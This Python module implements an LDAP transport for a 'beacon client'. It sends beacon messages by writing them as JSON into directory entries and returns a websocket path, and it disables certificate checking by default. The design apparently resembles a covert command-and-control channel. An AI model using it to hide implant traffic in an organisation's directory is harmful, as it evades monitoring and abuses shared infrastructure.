from __future__ import annotations

import traceback
import asyncio
import json
import ssl
import time

from ldap3 import Connection, Server, SIMPLE, Tls, MODIFY_REPLACE
from ldap3.core.exceptions import LDAPException

from beacon_client.channels.base import BeaconChannel
from beacon_client.models.messages import BeaconMessage, BeaconResponse, ChannelName


class LdapChannel(BeaconChannel):
    def __init__(
        self,
        host: str,
        port: int,
        user: str,
        password: str,
        base_dn: str,
        use_ssl: bool = False,
        verify: bool = False,
        timeout: float = 15.0,
    ) -> None:
        self._host = host
        self._port = int(port)
        self._user = user
        self._password = password
        self._base_dn = base_dn
        self._use_ssl = use_ssl
        self._verify = verify
        self._timeout = int(timeout)

        self._bind_dn = _normalize_bind_dn(user, base_dn)
        self._tls = None
        if self._use_ssl:
            validate = ssl.CERT_REQUIRED if self._verify else ssl.CERT_NONE
            self._tls = Tls(validate=validate)

    @property
    def name(self) -> ChannelName:
        return ChannelName.LDAP

    async def send_alive(self, payload: BeaconMessage) -> BeaconResponse:
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, self._send_blocking, payload)

    def _send_blocking(self, payload: BeaconMessage) -> BeaconResponse:
        server = Server(
            self._host,
            port=self._port,
            use_ssl=self._use_ssl,
            tls=self._tls,
            connect_timeout=self._timeout,
        )

        try:
            if self._bind_dn:
                conn = Connection(
                    server,
                    user=self._bind_dn,
                    password=self._password,
                    authentication=SIMPLE,
                    receive_timeout=self._timeout,
                    auto_bind=True
                )
            else:
                conn = Connection(server, receive_timeout=self._timeout, auto_bind=True)
        except LDAPException as exc:
            return BeaconResponse(status_code=500, detail=f"LDAP bind error: {exc}")

        try:
            entry_dn, attributes = _build_entry(payload, self._base_dn)
            ok = conn.add(entry_dn, attributes=attributes)
            if not ok:
                result = conn.result or {}
                if result.get("description") == "entryAlreadyExists":
                    ok = conn.modify(
                        entry_dn,
                        {
                            "description": [
                                (MODIFY_REPLACE, [attributes["description"][0]]),
                            ]
                        },
                    )
                if not ok:
                    return BeaconResponse(
                        status_code=500,
                        detail=f"LDAP add failed: {result}",
                    )
        except LDAPException as exc:
            traceback.print_exc()
            return BeaconResponse(status_code=500, detail=f"LDAP error: {exc}")
        finally:
            try:
                conn.unbind()
            except Exception:
                pass

        return BeaconResponse(
            status_code=201,
            detail="Beacon accepted over LDAP",
            websocket_path=f"/ws/{payload.client_id}",
            accepted_channel=ChannelName.LDAP,
        )


def _normalize_bind_dn(user: str, base_dn: str) -> str:
    if not user:
        return ""
    normalized = user.strip()
    if "=" in normalized and "," in normalized:
        return normalized
    return f"cn={normalized},{base_dn}"


def _build_entry(payload: BeaconMessage, base_dn: str) -> tuple[str, dict[str, list[str]]]:
    safe_client_id = _sanitize_client_id(payload.client_id)
    entry_dn = f"cn={safe_client_id}-{int(time.time() * 1000)},{base_dn}"
    payload_json = json.dumps(payload.model_dump(mode="json"))

    attributes = {
        "objectClass": ["top", "inetOrgPerson"],
        "cn": [safe_client_id],
        "sn": [safe_client_id],
        "description": [payload_json],
        "displayName": [f"Beacon {payload.client_id}"],
    }

    return entry_dn, attributes


def _sanitize_client_id(client_id: str) -> str:
    cleaned = "".join(ch if ch.isalnum() or ch in ("-", "_") else "-" for ch in client_id)
    return cleaned or "unknown"
